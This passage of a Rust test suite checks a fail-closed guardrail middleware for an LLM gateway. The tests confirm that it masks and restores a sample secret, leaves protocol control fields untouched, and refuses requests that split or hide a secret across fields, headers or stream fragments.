    fn streamed_restoration_never_accepts_another_routes_display_shape() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let mut cases = [
            (
                MiddlewareSurface::ChatCompletions,
                ProviderStreamEvent::Data {
                    event: Some("content_block_delta".to_owned()),
                    data: json!({
                        "type": "content_block_delta",
                        "index": 0,
                        "delta": {"type": "text_delta", "text": token.clone()}
                    }),
                },
            ),
            (
                MiddlewareSurface::NativeMessages,
                ProviderStreamEvent::Data {
                    event: None,
                    data: json!({"choices": [{
                        "index": 0,
                        "delta": {"content": token.clone()}
                    }]}),
                },
            ),
            (
                MiddlewareSurface::Responses,
                ProviderStreamEvent::Data {
                    event: None,
                    data: json!({"choices": [{
                        "index": 0,
                        "delta": {"content": token.clone()}
                    }]}),
                },
            ),
        ];
        for (surface, event) in &mut cases {
            let original = event.clone();
            middleware
                .apply_for_surface(
                    Some(*surface),
                    MiddlewarePhase::StreamEvent(event),
                    Some(&mut state),
                )
                .unwrap();
            assert_eq!(*event, original);
            assert!(!format!("{event:?}").contains(SECRET));
        }
        middleware.finish_stream(Some(&mut state)).unwrap();
    }

    #[test]
    fn provider_cannot_relocate_a_token_into_streamed_tool_arguments() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let mut event = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{"index": 0, "delta": {
                "content": token.clone(),
                "tool_calls": [{"function": {"arguments": token.clone()}}]
            }}]}),
        };

        middleware
            .apply(MiddlewarePhase::StreamEvent(&mut event), Some(&mut state))
            .unwrap();
        let ProviderStreamEvent::Data { data, .. } = event else {
            panic!("data event")
        };
        assert_eq!(data["choices"][0]["delta"]["content"], SECRET);
        assert_eq!(
            data["choices"][0]["delta"]["tool_calls"][0]["function"]["arguments"],
            token
        );

        for mut event in [
            ProviderStreamEvent::Data {
                event: Some("content_block_delta".to_owned()),
                data: json!({
                    "type": "content_block_delta",
                    "delta": {"type": "input_json_delta", "text": token.clone()}
                }),
            },
            ProviderStreamEvent::Data {
                event: Some("response.output_text.delta".to_owned()),
                data: json!({
                    "type": "response.function_call_arguments.delta",
                    "delta": token.clone()
                }),
            },
        ] {
            let original = event.clone();
            middleware
                .apply(MiddlewarePhase::StreamEvent(&mut event), Some(&mut state))
                .unwrap();
            assert_eq!(event, original);
        }
        middleware.finish_stream(Some(&mut state)).unwrap();
    }

    #[test]
    fn direct_route_protocol_control_matches_refuse_before_mutation() {
        let cases = [
            (
                MiddlewareSurface::ChatCompletions,
                json!({"messages": [{"role": "user", "content": "ordinary prompt"}]}),
                "user",
            ),
            (
                MiddlewareSurface::NativeMessages,
                json!({"messages": [{"role": "user", "content": [{
                    "type": "image",
                    "source": {
                        "type": "base64",
                        "media_type": "image/png",
                        "data": "iVBORw0KGgo="
                    }
                }]}]}),
                "image/png",
            ),
            (
                MiddlewareSurface::Responses,
                json!({"input": [{"role": "user", "content": [{
                    "type": "input_text",
                    "text": "ordinary prompt"
                }]}]}),
                "input_text",
            ),
            (
                MiddlewareSurface::Embeddings,
                json!({"input": "ordinary prompt", "encoding_format": "float"}),
                "float",
            ),
            (
                MiddlewareSurface::ChatCompletions,
                json!({
                    "reasoning_effort": "high",
                    "messages": [{"role": "user", "content": "ordinary prompt"}]
                }),
                "high",
            ),
            (
                MiddlewareSurface::Responses,
                json!({
                    "input": "ordinary prompt",
                    "tools": [{"type": "function", "name": "lookup", "description": "safe"}]
                }),
                "lookup",
            ),
        ];

        for (surface, body, pattern) in cases {
            let middleware = middleware(
                7,
                vec![GuardrailRule {
                    id: "control".to_owned(),
                    pattern: regex::escape(pattern),
                    action: GuardrailAction::Redact,
                }],
            );
            let mut request = ProviderRequest {
                model: "alias".to_owned(),
                body,
            };
            let original = request.clone();
            let outcome = middleware
                .apply_for_surface(Some(surface), MiddlewarePhase::Request(&mut request), None)
                .unwrap();
            assert_eq!(
                outcome.verdict,
                MiddlewareVerdict::Refuse(MiddlewareRefusal::Policy)
            );
            assert!(outcome.state.is_none());
            assert_eq!(request, original);
        }
    }

    #[test]
    fn metadata_content_and_unknown_typed_text_refuse_atomically() {
        let middleware = middleware(7, vec![redact_rule()]);
        for (surface, body) in [
            (
                MiddlewareSurface::ChatCompletions,
                json!({
                    "messages": [{"role": "user", "content": "ordinary"}],
                    "metadata": {"content": SECRET}
                }),
            ),
            (
                MiddlewareSurface::Responses,
                json!({
                    "input": [{"role": "user", "content": [{
                        "type": "future_text_shape",
                        "text": SECRET
                    }]}]
                }),
            ),
        ] {
            let mut request = ProviderRequest {
                model: "alias".to_owned(),
                body,
            };
            let original = request.clone();
            let outcome = middleware
                .apply_for_surface(Some(surface), MiddlewarePhase::Request(&mut request), None)
                .unwrap();
            assert_eq!(
                outcome.verdict,
                MiddlewareVerdict::Refuse(MiddlewareRefusal::Policy)
            );
            assert!(outcome.state.is_none());
            assert_eq!(request, original);
        }
    }

    #[test]
    fn responses_content_requires_a_message_parent_and_a_safe_typed_part() {
        let middleware = middleware(7, vec![redact_rule()]);
        let unsafe_bodies = [
            json!({"input": [{"type": "function_call", "content": SECRET}]}),
            json!({"input": [{"type": "item_reference", "content": SECRET}]}),
            json!({"input": [{"type": "future_item", "content": SECRET}]}),
            json!({"input": [{
                "type": "function_call",
                "content": [{"type": "input_text", "text": SECRET}]
            }]}),
            json!({"input": [{
                "type": "item_reference",
                "content": [{"type": "input_text", "text": SECRET}]
            }]}),
            json!({"input": [{
                "type": "future_item",
                "content": [{"type": "input_text", "text": SECRET}]
            }]}),
        ];
        for body in unsafe_bodies {
            let mut request = ProviderRequest {
                model: "alias".to_owned(),
                body,
            };
            let original = request.clone();
            let outcome = middleware
                .apply_for_surface(
                    Some(MiddlewareSurface::Responses),
                    MiddlewarePhase::Request(&mut request),
                    None,
                )
                .expect("unsafe typed parent is a policy refusal");
            assert_eq!(
                outcome.verdict,
                MiddlewareVerdict::Refuse(MiddlewareRefusal::Policy)
            );
            assert!(outcome.state.is_none());
            assert_eq!(request, original);
        }

        for body in [
            json!({"input": [{"role": "user", "content": SECRET}]}),
            json!({"input": [{"type": "message", "role": "user", "content": SECRET}]}),
            json!({"input": [{
                "type": "message",
                "role": "user",
                "content": [{"type": "input_text", "text": SECRET}]
            }]}),
        ] {
            let mut request = ProviderRequest {
                model: "alias".to_owned(),
                body,
            };
            let outcome = middleware
                .apply_for_surface(
                    Some(MiddlewareSurface::Responses),
                    MiddlewarePhase::Request(&mut request),
                    None,
                )
                .expect("message content is redactable");
            assert_eq!(outcome.verdict, MiddlewareVerdict::Continue);
            assert!(outcome.state.is_some());
            assert!(!request.body.to_string().contains(SECRET));
        }
    }

    #[test]
    fn structural_prompt_allowlist_covers_text_descriptions_and_serialized_arguments() {
        let middleware = middleware(
            7,
            vec![GuardrailRule {
                id: "exact-email".to_owned(),
                pattern: regex::escape(SECRET),
                action: GuardrailAction::Redact,
            }],
        );
        let cases = [
            (
                MiddlewareSurface::ChatCompletions,
                json!({
                    "messages": [{
                        "role": "assistant",
                        "content": SECRET,
                        "tool_calls": [{"function": {"name": "lookup", "arguments": SECRET}}]
                    }],
                    "tools": [{"type": "function", "function": {
                        "name": "lookup",
                        "description": SECRET,
                        "parameters": {"type": "object", "description": SECRET}
                    }}]
                }),
                vec![
                    "/messages/0/content",
                    "/messages/0/tool_calls/0/function/arguments",
                    "/tools/0/function/description",
                    "/tools/0/function/parameters/description",
                ],
            ),
            (
                MiddlewareSurface::NativeMessages,
                json!({
                    "system": SECRET,
                    "messages": [{"role": "user", "content": [{"type": "text", "text": SECRET}]}],
                    "tools": [{
                        "name": "lookup",
                        "description": SECRET,
                        "input_schema": {"type": "object", "description": SECRET}
                    }]
                }),
                vec![
                    "/system",
                    "/messages/0/content/0/text",
                    "/tools/0/description",
                    "/tools/0/input_schema/description",
                ],
            ),
            (
                MiddlewareSurface::Responses,
                json!({
                    "instructions": SECRET,
                    "input": [
                        {"role": "user", "content": [{"type": "input_text", "text": SECRET}]},
                        {"type": "function_call", "arguments": SECRET}
                    ],
                    "tools": [{
                        "type": "function",
                        "name": "lookup",
                        "description": SECRET,
                        "parameters": {"type": "object", "description": SECRET}
                    }]
                }),
                vec![
                    "/instructions",
                    "/input/0/content/0/text",
                    "/input/1/arguments",
                    "/tools/0/description",
                    "/tools/0/parameters/description",
                ],
            ),
            (
                MiddlewareSurface::Embeddings,
                json!({"input": [SECRET, SECRET], "encoding_format": "float"}),
                vec!["/input/0", "/input/1"],
            ),
        ];

        for (surface, body, paths) in cases {
            let mut request = ProviderRequest {
                model: "alias".to_owned(),
                body,
            };
            let outcome = middleware
                .apply_for_surface(Some(surface), MiddlewarePhase::Request(&mut request), None)
                .unwrap();
            assert_eq!(outcome.verdict, MiddlewareVerdict::Continue);
            for path in paths {
                let masked = request
                    .body
                    .pointer(path)
                    .and_then(Value::as_str)
                    .expect("allowlisted string remains a string");
                assert!(masked.starts_with(TOKEN_PREFIX), "{surface:?} {path}");
                assert!(!masked.contains(SECRET), "{surface:?} {path}");
            }
        }
    }

    #[test]
    fn route_prompt_text_matches_remain_redactable_without_mutating_controls() {
        let middleware = middleware(7, vec![redact_rule()]);
        let cases = [
            (
                MiddlewareSurface::ChatCompletions,
                json!({"messages": [{"role": "user", "content": SECRET}]}),
                "/messages/0/content",
                "/messages/0/role",
                "user",
            ),
            (
                MiddlewareSurface::NativeMessages,
                json!({"messages": [{"role": "user", "content": SECRET}]}),
                "/messages/0/content",
                "/messages/0/role",
                "user",
            ),
            (
                MiddlewareSurface::Responses,
                json!({"input": [{"role": "user", "content": [{
                    "type": "input_text",
                    "text": SECRET
                }]}]}),
                "/input/0/content/0/text",
                "/input/0/content/0/type",
                "input_text",
            ),
            (
                MiddlewareSurface::Embeddings,
                json!({"input": SECRET, "encoding_format": "float"}),
                "/input",
                "/encoding_format",
                "float",
            ),
        ];

        for (surface, body, prompt_path, control_path, control) in cases {
            let mut request = ProviderRequest {
                model: "alias".to_owned(),
                body,
            };
            let outcome = middleware
                .apply_for_surface(Some(surface), MiddlewarePhase::Request(&mut request), None)
                .unwrap();
            assert_eq!(outcome.verdict, MiddlewareVerdict::Continue);
            assert!(outcome.state.is_some());
            assert_ne!(
                request.body.pointer(prompt_path).and_then(Value::as_str),
                Some(SECRET)
            );
            assert_eq!(
                request.body.pointer(control_path).and_then(Value::as_str),
                Some(control)
            );
        }
    }

    #[test]
    fn protected_values_and_body_member_names_cannot_complete_a_multi_fragment_evasion() {
        let protected = [
            ("anthropic-version".to_owned(), "ab".to_owned()),
            ("anthropic-beta".to_owned(), "cd".to_owned()),
        ];
        let request = ProviderRequest {
            model: "alias".to_owned(),
            // A null value leaves the caller-controlled member name as the last
            // string in the canonical provider-body sequence.
            body: json!({"ef": null}),
        };
        for pattern in ["abcdef", "efabcd"] {
            let guardrail = middleware(
                7,
                vec![GuardrailRule {
                    id: format!("split-{pattern}"),
                    pattern: pattern.to_owned(),
                    action: GuardrailAction::Redact,
                }],
            );
            assert_eq!(
                guardrail
                    .inspect_protected_request(
                        Some(MiddlewareSurface::NativeMessages),
                        &request,
                        &protected,
                    )
                    .unwrap(),
                Some(MiddlewareRefusal::Policy),
                "full canonical sequences must refuse in both directions: {pattern}"
            );
        }

        let protected = [("anthropic-version".to_owned(), "ab".to_owned())];
        let request = ProviderRequest {
            model: "alias".to_owned(),
            body: json!({"ef": "cd"}),
        };
        for pattern in ["abefcd", "efcdab"] {
            let guardrail = middleware(
                7,
                vec![GuardrailRule {
                    id: format!("split-{pattern}"),
                    pattern: pattern.to_owned(),
                    action: GuardrailAction::Redact,
                }],
            );
            assert_eq!(
                guardrail
                    .inspect_protected_request(
                        Some(MiddlewareSurface::NativeMessages),
                        &request,
                        &protected,
                    )
                    .unwrap(),
                Some(MiddlewareRefusal::Policy),
                "protected values, body names, and body values must form one complete sequence: {pattern}"
            );
        }
    }

    #[test]
    fn protected_body_sequences_remain_linear_with_many_canonical_fragments() {
        let protected = [
            ("anthropic-version".to_owned(), "ab".to_owned()),
            ("anthropic-beta".to_owned(), "cd".to_owned()),
        ];
        let mut fragments = Vec::with_capacity(20_002);
        fragments.push(Value::String("ef".to_owned()));
        fragments.extend((0..20_000).map(|index| Value::String(format!("noise-{index}"))));
        fragments.push(Value::String("gh".to_owned()));
        let request = ProviderRequest {
            model: "alias".to_owned(),
            body: json!({"input": fragments}),
        };

        for (id, pattern) in [
            ("forward", "abcdef"),
            // Frequent non-crossing matches force the boundary cursor across
            // the complete fragment set before the final reverse-order split.
            ("reverse-after-many-matches", "noise|ghabcd"),
        ] {
            let guardrail = middleware(
                7,
                vec![GuardrailRule {
                    id: format!("many-fragments-{id}"),
                    pattern: pattern.to_owned(),
                    action: GuardrailAction::Redact,
                }],
            );
            assert_eq!(
                guardrail
                    .inspect_protected_request(
                        Some(MiddlewareSurface::Embeddings),
                        &request,
                        &protected,
                    )
                    .unwrap(),
                Some(MiddlewareRefusal::Policy),
                "complete canonical sequence must catch {pattern}"
            );
        }
    }

    #[test]
    fn unrewritable_keys_controls_and_split_fragments_refuse_atomically() {
        let middleware = middleware(7, vec![redact_rule()]);

        let mut keyed = json!({"tools": [{"function": {"parameters": {
            "type": "object", "properties": {}
        }}}]});
        keyed["tools"][0]["function"]["parameters"]["properties"]
            .as_object_mut()
            .unwrap()
            .insert(SECRET.to_owned(), json!({"type": "string"}));
        let mut requests = [
            (
                MiddlewareSurface::ChatCompletions,
                ProviderRequest {
                    model: "alias".to_owned(),
                    body: keyed,
                },
            ),
            (
                MiddlewareSurface::Responses,
                ProviderRequest {
                    model: "alias".to_owned(),
                    body: json!({"previous_response_id": SECRET}),
                },
            ),
            (
                MiddlewareSurface::Responses,
                ProviderRequest {
                    model: "alias".to_owned(),
                    body: json!({"metadata": {"alice@": "example.com"}}),
                },
            ),
            (
                MiddlewareSurface::ChatCompletions,
                ProviderRequest {
                    model: "alias".to_owned(),
                    body: json!({"messages": [{"content": [
                        {"type": "text", "text": "alice@"},
                        {"type": "text", "text": "example.com"}
                    ]}]}),
                },
            ),
            (
                MiddlewareSurface::ChatCompletions,
                ProviderRequest {
                    model: "alias".to_owned(),
                    body: json!({"messages": [{"content": [
                        {"type": "image_url", "image_url": {
                            "url": "https://example.test/alice@"
                        }},
                        {"type": "text", "text": "example.com"}
                    ]}]}),
                },
            ),
            (
                MiddlewareSurface::ChatCompletions,
                ProviderRequest {
                    model: "alias".to_owned(),
                    body: json!({"messages": [{"content": [
                        {"type": "text", "text": "alice@"},
                        {"type": "image_url", "image_url": {"url": "https://example.test/i"}},
                        {"type": "text", "text": "example.com"}
                    ]}]}),
                },
            ),
            (
                MiddlewareSurface::NativeMessages,
                ProviderRequest {
                    model: "alias".to_owned(),
                    body: json!({"messages": [{"role": "user", "content": [
                        {"type": "text", "text": "alice@"},
                        {"type": "image", "source": {
                            "type": "base64",
                            "media_type": "image/png",
                            "data": "iVBORw0KGgo="
                        }},
                        {"type": "text", "text": "example.com"}
                    ]}]}),
                },
            ),
            (
                MiddlewareSurface::NativeMessages,
                ProviderRequest {
                    model: "alias".to_owned(),
                    body: json!({"messages": [{"role": "user", "content": [
                        {"type": "image", "source": {
                            "type": "url",
                            "url": "https://example.test/alice@"
                        }},
                        {"type": "text", "text": "example.com"}
                    ]}]}),
                },
            ),
            (
                MiddlewareSurface::Responses,
                ProviderRequest {
                    model: "alias".to_owned(),
                    body: json!({"input": [{"role": "user", "content": [
                        {"type": "input_image", "image_url": "https://example.test/alice@"},
                        {"type": "input_text", "text": "example.com"}
                    ]}]}),
                },
            ),
            (
                MiddlewareSurface::Responses,
                ProviderRequest {
                    model: "alias".to_owned(),
                    body: json!({"instructions": "alice@", "input": "example.com"}),
                },
            ),
            (
                MiddlewareSurface::NativeMessages,
                ProviderRequest {
                    model: "alias".to_owned(),
                    body: json!({
                        "system": "alice@",
                        "messages": [{"role": "user", "content": "example.com"}]
                    }),
                },
            ),
            (
                MiddlewareSurface::ChatCompletions,
                ProviderRequest {
                    model: "alias".to_owned(),
                    body: json!({
                        "messages": [{
                            "role": "user",
                            "name": "alice@",
                            "content": "example.com"
                        }]
                    }),
                },
            ),
        ];
        for (case, (surface, request)) in requests.iter_mut().enumerate() {
            let original = request.clone();
            let outcome = middleware
                .apply_for_surface(Some(*surface), MiddlewarePhase::Request(request), None)
                .unwrap();
            assert_eq!(
                outcome.verdict,
                MiddlewareVerdict::Refuse(MiddlewareRefusal::Policy),
                "case {case}: {surface:?} {}",
                original.body
            );
            assert!(outcome.state.is_none());
            assert_eq!(*request, original);
        }

        assert_eq!(
            middleware
                .inspect_protected_request_values(&[(
                    "anthropic-beta".to_owned(),
                    SECRET.to_owned(),
                )])
                .unwrap(),
            Some(MiddlewareRefusal::Policy)
        );

        let protected_split_request = ProviderRequest {
            model: "alias".to_owned(),
            body: json!({"messages": [{"role": "user", "content": [
                {"type": "text", "text": "@"},
                {"type": "text", "text": "example.com"}
            ]}]}),
        };
        assert_eq!(
            middleware
                .inspect_protected_request(
                    Some(MiddlewareSurface::ChatCompletions),
                    &protected_split_request,
                    &[
                        ("anthropic-beta".to_owned(), "alice".to_owned()),
                        ("anthropic-version".to_owned(), "2023-06-01".to_owned()),
                    ],
                )
                .unwrap(),
            Some(MiddlewareRefusal::Policy)
        );
        assert_eq!(
            middleware
                .inspect_protected_request(
                    Some(MiddlewareSurface::ChatCompletions),
                    &ProviderRequest {
                        model: "alias".to_owned(),
                        body: json!({}),
                    },
                    &[
                        ("anthropic-beta".to_owned(), "alice@".to_owned()),
                        ("anthropic-version".to_owned(), "example.com".to_owned()),
                    ],
                )
                .unwrap(),
            Some(MiddlewareRefusal::Policy)
        );

        let mut routing_alias_is_not_provider_content = ProviderRequest {
            model: "alice@".to_owned(),
            body: json!({
                "model": "alice@",
                "messages": [{"role": "user", "content": "example.com"}]
            }),
        };
        let outcome = middleware
            .apply_for_surface(
                Some(MiddlewareSurface::ChatCompletions),
                MiddlewarePhase::Request(&mut routing_alias_is_not_provider_content),
                None,
            )
            .unwrap();
        assert_eq!(outcome.verdict, MiddlewareVerdict::Continue);
        assert_eq!(
            routing_alias_is_not_provider_content.body["model"],
            "alice@"
        );
        assert_eq!(
            routing_alias_is_not_provider_content.body["messages"][0]["content"],
            "example.com"
        );

        let duplicate_guardrail = self::middleware(
            7,
            vec![GuardrailRule {
                id: "duplicate-only".to_owned(),
                pattern: "abcabc".to_owned(),
                action: GuardrailAction::Redact,
            }],
        );
        assert_eq!(
            duplicate_guardrail
                .inspect_protected_request(
                    Some(MiddlewareSurface::Responses),
                    &ProviderRequest {
                        model: "alias".to_owned(),
                        body: json!({"previous_response_id": "abc"}),
                    },
                    &[("previous_response_id".to_owned(), "abc".to_owned())],
                )
                .unwrap(),
            None,
            "the protected continuation appears on the provider wire only once"
        );

        for mut request in [
            ProviderRequest {
                model: "alias".to_owned(),
                body: json!({"stream": SECRET}),
            },
            ProviderRequest {
                model: "alias".to_owned(),
                body: json!({"previous_response_id": {"value": SECRET}}),
            },
        ] {
            let original = request.clone();
            let outcome = middleware
                .apply(MiddlewarePhase::Request(&mut request), None)
                .unwrap();
            assert_eq!(
                outcome.verdict,
                MiddlewareVerdict::Refuse(MiddlewareRefusal::InvalidRequest)
            );
            assert!(outcome.state.is_none());
            assert_eq!(request, original);
        }
    }

    #[test]
    fn incomplete_carry_fails_finalization_without_flushing_and_can_resume() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let cut = token.len() / 2;
        let mut partial = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{"index": 0, "delta": {"content": &token[..cut]}}]}),
        };
        middleware
            .apply(MiddlewarePhase::StreamEvent(&mut partial), Some(&mut state))
            .unwrap();

        assert_eq!(
            middleware.finish_stream(Some(&mut state)),
            Err(MiddlewareError::Failed)
        );
        assert_eq!(
            middleware.finish_stream(Some(&mut state)),
            Err(MiddlewareError::Failed)
        );

        let mut remainder = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{"index": 0, "delta": {"content": &token[cut..]}}]}),
        };
        middleware
            .apply(
                MiddlewarePhase::StreamEvent(&mut remainder),
                Some(&mut state),
            )
            .unwrap();
        let ProviderStreamEvent::Data { data, .. } = remainder else {
            panic!("data event")
        };
        assert_eq!(data["choices"][0]["delta"]["content"], SECRET);
        middleware.finish_stream(Some(&mut state)).unwrap();
    }

    #[test]
    fn a_carried_generated_prefix_that_diverges_is_released_as_literal_text() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let cut = token.len() / 2;
        let mut partial = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{"index": 0, "delta": {"content": &token[..cut]}}]}),
        };
        middleware
            .apply(MiddlewarePhase::StreamEvent(&mut partial), Some(&mut state))
            .unwrap();

        let mut divergent = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{"index": 0, "delta": {"content": "not-the-token"}}]}),
        };
        middleware
            .apply(
                MiddlewarePhase::StreamEvent(&mut divergent),
                Some(&mut state),
            )
            .unwrap();
        let ProviderStreamEvent::Data { data, .. } = divergent else {
            panic!("data event")
        };
        assert_eq!(
            data["choices"][0]["delta"]["content"],
            format!("{}not-the-token", &token[..cut])
        );
        middleware.finish_stream(Some(&mut state)).unwrap();
    }

    #[test]
    fn terminal_usage_is_not_a_stream_finalization_payload() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let mut partial = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{"index": 0, "delta": {
                "content": &token[..TOKEN_PREFIX.len()]
            }}]}),
        };
        middleware
            .apply(MiddlewarePhase::StreamEvent(&mut partial), Some(&mut state))
            .unwrap();

        let mut done = ProviderStreamEvent::Done(ModelUsage::default());
        middleware
            .apply(MiddlewarePhase::StreamEvent(&mut done), None)
            .expect("terminal usage is ignored by middleware");
        assert_eq!(
            middleware.finish_stream(Some(&mut state)),
            Err(MiddlewareError::Failed)
        );
    }

    #[test]
    fn fail_open_and_zero_width_rules_are_rejected_before_activation() {
        let mut fail_open = declaration();
        fail_open.failure_posture = MiddlewareFailurePosture::FailOpen;
        assert!(matches!(
            DeterministicGuardrail::compile(fail_open, &[7_u8; 32], &[redact_rule()]),
            Err(GuardrailCompileError::RequiresFailClosed)
        ));

        let error = match DeterministicGuardrail::compile(
            declaration(),
            &[7_u8; 32],
            &[GuardrailRule {
                id: "boundary".to_owned(),
                pattern: r"\b".to_owned(),
                action: GuardrailAction::Redact,
            }],
        ) {
            Ok(_) => panic!("a zero-width rule cannot advance a masking cursor"),
            Err(error) => error,
        };
        assert!(matches!(error, GuardrailCompileError::EmptyMatch(id) if id == "boundary"));
    }
}
